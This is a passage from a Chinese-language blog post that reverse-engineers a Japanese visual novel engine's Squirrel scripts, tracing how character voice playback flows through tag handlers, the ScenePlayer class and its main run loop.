class="line">/**</span><br><span class="line"> * 次回鳴らすボイスの情報をクリア</span><br><span class="line"> */</span><br><span class="line">function clearNextVoice() &#123;</span><br><span class="line">    nextvoices = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，<code>nextvoices</code> 的作用是保存“下次播放的声音信息”，键为“角色名”，值为“声音”，并且仅在 <code>entryNextVoice</code> 中被写入，同时写入了 <code>voice</code> 也就是“语音指定”以及 <code>voicen</code> 也就是“非默认语音指定”两个信息，那么再找找哪里调用该函数写入接下来要播放的声音信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ボイス追加</span><br><span class="line"> */</span><br><span class="line">function tag_entryvoice(elm) &#123;</span><br><span class="line">    entryNextVoice(elm.name, elm.voice, getval(elm, &quot;voicen&quot;));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 名前表示</span><br><span class="line"> */</span><br><span class="line">function tag_dispname(elm) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    </span><br><span class="line">    //dm(&quot; 名前表示ハンドラ &quot;);</span><br><span class="line">    if (elm == null || !(&quot;name&quot; in elm)  || elm.name == &quot;&quot;) &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        </span><br><span class="line">        local name = getval(elm, &quot;name&quot;);</span><br><span class="line">        local disp = getval(elm, &quot;disp&quot;);</span><br><span class="line">        </span><br><span class="line">        local ch = env.getCharacter(name, null);</span><br><span class="line">        env.currentNameTarget = ch;</span><br><span class="line">        if (&quot;voice&quot; in elm) &#123;</span><br><span class="line">            entryNextVoice(name, elm.voice, getval(elm, &quot;voicen&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">        // 名前の決定</span><br><span class="line">        // ...</span><br><span class="line">        </span><br><span class="line">        // 名前加工処理</span><br><span class="line">        // ...</span><br><span class="line">        </span><br><span class="line">        // 表情判定</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 名前表示</span><br><span class="line">    // ...</span><br><span class="line">    </span><br><span class="line">    // ボイス再生</span><br><span class="line">    if (nextvoices != null) &#123;</span><br><span class="line">        local ret = playNextVoice();</span><br><span class="line">        if (ret &gt; 0) &#123;</span><br><span class="line">            addAutoWait(ret);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样在 <code>28_43000_d330.nut</code> 文件中，有两个 <code>tag</code> 开头的函数：<code>tag_entryvoice</code> 以及 <code>tag_dispname</code>。可以看到 <code>name</code>，<code>voice</code> 以及 <code>voicen</code> 主要来自 <code>elm</code> 参数。</p><p>根据注释以及代码逻辑，<code>tag_entryvoice</code> 的作用是在某个时刻追加要播放的声音，而主要播放逻辑在 <code>tag_dispname</code> 中，首先调用 <code>entryNextVoice</code> 从 <code>elm</code> 中获取所有接下来要播放的声音添加到全局变量 <code>nextvoices</code> 中，之后以此处理名称，名称前缀以及表情等，最后再调用 <code>palyNextVoice</code> 播放这些声音，并且阻塞等待播放完毕。</p><p>这些 <code>tag</code> 开头的函数作为回调函数保存在同文件的 <code>getHandlers</code> 函数中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function getHandlers()</span><br><span class="line">&#123;</span><br><span class="line">    return &#123; // 辞書配列オブジェクト</span><br><span class="line">        // ...</span><br><span class="line">        //----------------------------------------------- ボイス制御</span><br><span class="line">        </span><br><span class="line">        entryvoice    = tag_entryvoice,</span><br><span class="line">        // ...</span><br><span class="line">        dispname      = tag_dispname,</span><br><span class="line">        // ...</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来找找哪里获取并调用了这几个回调函数。同样仅在 <code>28_43000_d330.nut</code> 中 <code>ScenePlayer</code> 类的构造函数 <code>constructor</code> 调用 <code>getHandlers</code> 获取所有回调函数保存在 <code>handlers</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * シーン再生プレイヤー</span><br><span class="line"> * ・シーンの再生機能</span><br><span class="line"> * ・シーンのセーブとロード</span><br><span class="line"> */</span><br><span class="line">class ScenePlayer extends GamePlayer</span><br><span class="line">&#123;</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * コンストラクタ</span><br><span class="line">     */</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        ::GamePlayer.constructor();</span><br><span class="line">        pendings = [];</span><br><span class="line">        branches = [];</span><br><span class="line">        targetBranches = [];</span><br><span class="line">        env = Environment(this, SCWIDTH, SCHEIGHT);</span><br><span class="line">        if (&quot;nameImageMap&quot; in env.envinfo) &#123;</span><br><span class="line">            setNameImageMap(env.envinfo.nameImageMap);</span><br><span class="line">        &#125;</span><br><span class="line">        sceneInfos = dofile(&quot;scenes.nut&quot;);</span><br><span class="line">        handlers = getHandlers();</span><br><span class="line">        historyInit();</span><br><span class="line">        selectOption = &#123;&#125;;</span><br><span class="line">        caches = &#123;&#125;;</span><br><span class="line">        particles = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，这个类是一个“场景再生播放器”，负责“场景的再生功能”以及“场景的保存和载入”，在日语中“再生”就是重放的意思，那么肯定是在这个类中根据场景的变换，播放文本以及对应的音频。实际上 <code>28_43000_d330.nut</code> 文件中的函数以及全局变量（类的静态变量）都属于这个类，包括 <code>playVoices</code>，<code>playNextVoice</code>，<code>nexvoices</code>，<code>entryNextVoice</code>，<code>tag_entryvoice</code>，<code>tag_dispname</code>，<code>getHandlers</code> 以及下面的 <code>onTag</code>。再找找哪里使用了 <code>handlers</code>，发现主要是在同文件同类下的 <code>onTag</code> 中。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * タグの処理</span><br><span class="line"> */</span><br><span class="line">function onTag(elm) &#123;</span><br><span class="line">    local tagname = elm.tagname;</span><br><span class="line">    //dm(&quot; シーンタグ:&quot; + tagname);</span><br><span class="line">    if (tagname in handlers) &#123;</span><br><span class="line">        local handler = handlers[tagname];</span><br><span class="line">        local ret = handler(elm);</span><br><span class="line">        lastTagName = tagname;</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">    // 無効なタグ</span><br><span class="line">    local ret = env.unknown(tagname, elm);</span><br><span class="line">    if (ret == null) &#123;</span><br><span class="line">        local msg = &quot; タグ / マクロ \&quot;&quot; + tagname + &quot;\&quot; は存在しません &quot;;</span><br><span class="line">        errorCmd(msg);</span><br><span class="line">        return 0;</span><br><span class="line">        //throw new Exception(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 <code>onTag</code> 可以发现 <code>elm</code> 中会保存 <code>tagname</code>，也就是对应的回调函数名称，而这个函数则就是调用 <code>elm</code> 指定的回调函数，并且回调参数固定为 <code>elm</code>。接下来再找找哪里调用了 <code>onTag</code>，也许就可以找到哪里给 <code>elm</code> 指定了回调函数，发现同样是在同文件同类下的一个非常大的函数 <code>run</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * メインロジック</span><br><span class="line"> */</span><br><span class="line">function run()    &#123;</span><br><span class="line">    local obj;</span><br><span class="line">    for(;;)    &#123;</span><br><span class="line"></span><br><span class="line">        // ロード復帰処理</span><br><span class="line">        if (targetPage != null) &#123;</span><br><span class="line">            // ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (pendings.len() &gt; 0) &#123;</span><br><span class="line">            // 後回しにされたタグがある場合</span><br><span class="line">            obj = pendings[0];</span><br><span class="line">            pendings.remove(0);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 表示テキストがある場合の処理</span><br><span class="line">            if (currentText.len() &gt; 0) &#123;</span><br><span class="line">//                    if (isSkip()) &#123;</span><br><span class="line">//                        obj = &#123;tagname=&quot;ch2&quot;, text=currentText&#125;;</span><br><span class="line">//                        currentText = &quot;&quot;;</span><br><span class="line">//                    &#125; else &#123;</span><br><span class="line">                    if (iskanji(currentText)) &#123;</span><br><span class="line">                        local ch = currentText.slice(0,2);</span><br><span class="line">                        currentText = currentText.slice(2);</span><br><span class="line">                        obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        local ch = currentText.slice(0,1);</span><br><span class="line">                        currentText = currentText.slice(1);</span><br><span class="line">                        obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">//                    &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (cur &lt; lines.len()) &#123;</span><br><span class="line">                    obj = lines[cur++];</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    obj = null;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (obj == null) &#123;</span><br><span class="line">            // シナリオ終了</span><br><span class="line">            //dm(&quot; シナリオ終了 cur:&quot; + curStorage + &quot; next:&quot; + nextStorage) ;</span><br><span class="line">            local next = nextStorage;</span><br><span class="line">            if (next == null || next == 0) &#123;</span><br><span class="line">                next = getNextScene(curStorage);</span><br><span class="line">            &#125;                    </span><br><span class="line">            dm(&quot;next:&quot; + next);</span><br><span class="line">            if (next != null &amp;&amp; next != &quot;&quot; &amp;&amp; next != 0) &#123;</span><br><span class="line">                goToNext(next);</span><br><span class="line">                continue;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                status = STOP;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;label&quot;) &#123; // ラベル処理</span><br><span class="line">            if (targetPage != null) &#123;</span><br><span class="line">                if (targetBranches.len() &gt; 0) &#123;</span><br><span class="line">                    if (obj.count != targetBranches[0]) &#123;</span><br><span class="line">                        goToCount(targetBranches[0]);</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        targetBranches.remove(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    // XXX ロード失敗</span><br><span class="line">                    dm(&quot; ロード失敗: ラベルの整合不良 &quot;);</span><br><span class="line">                    status = STOP;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            setReaded(curPage);    // 次のラベルに進む前に最後の行の既読をたてる</span><br><span class="line">            curCount = obj.count;</span><br><span class="line">            branches.append(curCount);</span><br><span class="line">            curPage = 0;</span><br><span class="line">            savePrepare();</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;begintrans&quot;) &#123;</span><br><span class="line">            //dm(&quot; 全体トランジションを処理 &quot;);</span><br><span class="line">            obj = null;</span><br><span class="line">            while (cur &lt; lines.len() &amp;&amp; (obj = lines[cur++]) != null &amp;&amp; obj.tagname != &quot;endtrans&quot;) &#123;</span><br><span class="line">                if (obj.tagname == &quot;begintrans&quot;) &#123;</span><br><span class="line">                    throw &quot;begintrans は入れ子にできません &quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                pendings.append(obj);</span><br><span class="line">            &#125;</span><br><span class="line">            if (obj == null) &#123;</span><br><span class="line">                throw &quot;begintrans に対応する endtrans がありません &quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            if (!isJump()) &#123;</span><br><span class="line">                local trans = null;</span><br><span class="line">                foreach (cmd, param in obj) &#123;</span><br><span class="line">                    if (cmd == &quot;tagname&quot;) &#123;</span><br><span class="line">                        // ignore</span><br><span class="line">                    &#125; else if (cmd == &quot;trans&quot;) &#123;</span><br><span class="line">                        local tr = getTrans(param, obj);</span><br><span class="line">                        if (tr != null) &#123;</span><br><span class="line">                            trans = tr;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; else if (cmd == &quot;fade&quot;) &#123;</span><br><span class="line">                        local time = param.tointeger();</span><br><span class="line">                        trans = &#123;</span><br><span class="line">                            method = &quot;crossfade&quot;,</span><br><span class="line">                            time = time &gt; 1 ? time : env.getFadeValue(),</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        local tr = getTrans(cmd, obj);</span><br><span class="line">                        if (tr != null) &#123;</span><br><span class="line">                            trans = tr;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                if (trans != null &amp;&amp; &quot;msgoff&quot; in trans) &#123;</span><br><span class="line">                    insertTag(&quot;msgoff&quot;, null);</span><br><span class="line">                &#125;</span><br><span class="line">                if (trans != null &amp;&amp; getval(trans, &quot;method&quot;) == &quot;layer&quot;) &#123;</span><br><span class="line">                    insertTag(&quot;_beginlt&quot;, trans);</span><br><span class="line">                    local e = &#123;&#125;;</span><br><span class="line">                    if (&quot;transwait&quot; in trans) &#123;</span><br><span class="line">                        e.wait &lt;- getint(trans, &quot;transwait&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (&quot;endtime&quot; in trans) &#123;</span><br><span class="line">                        e.time &lt;- getint(trans, &quot;endtime&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (&quot;endtype&quot; in trans) &#123;</span><br><span class="line">                        e.type &lt;- getval(trans, &quot;endtype&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (&quot;endrule&quot; in trans) &#123;</span><br><span class="line">                        e.rule &lt;- getval(trans, &quot;endrule&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    addTag(&quot;_endlt&quot;, e);</span><br><span class="line">                &#125; else if (trans != null) &#123;</span><br><span class="line">                    insertTag(&quot;_begintrans&quot;, null);</span><br><span class="line">                    addTag(&quot;_endtrans&quot;, &#123;trans=trans&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;ch&quot;) &#123;</span><br><span class="line">            doText(obj.text);</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;embex&quot;) &#123; // 変数埋め込みの参照</span><br><span class="line">            if (&quot;exp&quot; in obj) &#123;</span><br><span class="line">                local text = ::eval(obj.exp);</span><br><span class="line">                if (typeof text == &quot;string&quot;) &#123;</span><br><span class="line">                    doText(text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // その他のコマンド</span><br><span class="line">            </span><br><span class="line">            // 実行時判定される cond</span><br><span class="line">            if (&quot;condex&quot; in obj) &#123;</span><br><span class="line">                if (!::eval(obj.condex)) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                //delete obj.condex;</span><br><span class="line">            &#125; else if (&quot;if&quot; in obj) &#123;</span><br><span class="line">                if (!::eval(obj[&quot;if&quot;])) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                //delete obj[&quot;if&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            // onTag を呼ぶ</span><br><span class="line">            local step = onTag(obj);</span><br><span class="line">            if (step == null) &#123;</span><br><span class="line">                throw &quot;onTag が null を返しました (&quot; + obj.tagname + &quot;)&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            step = step.tointeger(); // step を数値に</span><br><span class="line">            //dm(obj.tagname + &quot; タグ戻り値:&quot; + step);</span><br><span class="line">            </span><br><span class="line">            if (step == 0) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            if (step &lt; 0) &#123;</span><br><span class="line">                switch(step) &#123;</span><br><span class="line">                case -5: // いったんイベントを処理(現在のタグは後回し)</span><br><span class="line">                    pendings.insert(0, obj);</span><br><span class="line">                    return;</span><br><span class="line">                case -4: // いったんイベントを処理</span><br><span class="line">                    return;</span><br><span class="line">                case -3: // 後回ししてブレーク</span><br><span class="line">                    pendings.insert(0, obj);</span><br><span class="line">                    updateBeforeCh = 1;</span><br><span class="line">                    return;</span><br><span class="line">                case -2: // ブレーク</span><br><span class="line">                    updateBeforeCh = 1;</span><br><span class="line">                    return;</span><br><span class="line">                case -1: // シナリオ終了</span><br><span class="line">                    status = STOP;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                waitTime(step, false);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数是一个巨大的无限循环 <code>for(;;)</code>，但是看起来循环存在多种退出逻辑，因此不一定是游戏主循环，根据类以及函数注释，该函数很有可能是一个场景下的的主要处理逻辑。</p><p>分析一下这个函数的逻辑，主要从 <code>onTag</code> 那一行开始看起，<code>onTag</code> 的参数 <code>elm</code> 也就是该函数中的 <code>obj</code>，在调用 <code>onTag</code> 前都是在生成 <code>obj</code>，之后调用 <code>onTag</code> 处理 <code>obj</code>，之后返回一个 <code>step</code> 来决定循环是否继续或者直接退出。</p><p>在大循环中，首先判断了一下 <code>targetPage</code>，根据游戏经验以及注释，这个 if 分支可能是快速推进剧本到 <code>targetPage</code>，也就是实现快进功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// ロード復帰処理</span><br><span class="line">if (targetPage != null) &#123;</span><br><span class="line">    if (targetBranches.len() == 0 &amp;&amp; curPage &gt;= targetPage) &#123;</span><br><span class="line">        dm(&quot; ジャンプ終了 &quot;);</span><br><span class="line">        savePrepare();</span><br><span class="line">        showVariables(variables, VAR_GAME);</span><br><span class="line">        targetPage = null;</span><br><span class="line">        // 画面復帰処理</span><br><span class="line">        insertTag(&quot;_endlt&quot;, &#123;time=1000&#125;);</span><br><span class="line">        insertTag(&quot;_sync&quot;, null);</span><br><span class="line">        // すぐマスク</span><br><span class="line">        beginLayerTrans(&#123;time=0&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就是 <code>obj</code> 的生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">if (pendings.len() &gt; 0) &#123;</span><br><span class="line">    // 後回しにされたタグがある場合</span><br><span class="line">    obj = pendings[0];</span><br><span class="line">    pendings.remove(0);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // 表示テキストがある場合の処理</span><br><span class="line">    if (currentText.len() &gt; 0) &#123;</span><br><span class="line">//        if (isSkip()) &#123;</span><br><span class="line">//            obj = &#123;tagname=&quot;ch2&quot;, text=currentText&#125;;</span><br><span class="line">//            currentText = &quot;&quot;;</span><br><span class="line">//        &#125; else &#123;</span><br><span class="line">            if (iskanji(currentText)) &#123;</span><br><span class="line">                local ch = currentText.slice(0,2);</span><br><span class="line">                currentText = currentText.slice(2);</span><br><span class="line">                obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                local ch = currentText.slice(0,1);</span><br><span class="line">                currentText = currentText.slice(1);</span><br><span class="line">                obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">//        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (cur &lt; lines.len()) &#123;</span><br><span class="line">            obj = lines[cur++];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            obj = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <code>pendings</code> 队列非空则直接获取队首，否则生成新的，这里我们先关注生成。首先判断了 <code>currentText</code> 是否有值，根据变量名猜测这个可能就是当前要播放的文字，注释说该 if 分支表示“有显示文本时的处理”，在游戏大部分时候肯定都是有文字显示，那么进入该分支的频率可能会非常高。</p><p>如果 <code>currentText</code> 有值，则先判断 <code>iskanji</code>，日语中 kanji 是汉字的意思，实际上这里就是判断是否需要采用双字节编码。不管是否属于汉字，都将 <code>currentText</code> 的第一个字符切下来保存在 <code>obj.text</code> 中，<code>currentText</code> 保存剩下的，而此时 <code>tagname</code> 为 <code>ch2</code>也就是回调函数 <code>tag_ch</code>，很明显这不是我们想要的回调函数。如果 <code>currentText</code> 没有值，那么 <code>obj</code> 就可能会在 else 分支中来自 <code>lines</code> 数组，或者为 <code>null</code>。</p><p>看一下 <code>iskanji</code> 函数发现其实这里是将前一个句子结尾的标点符号截取出来，因此这里 <code>obj</code> 仅是为了处理一个标点字符而生成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 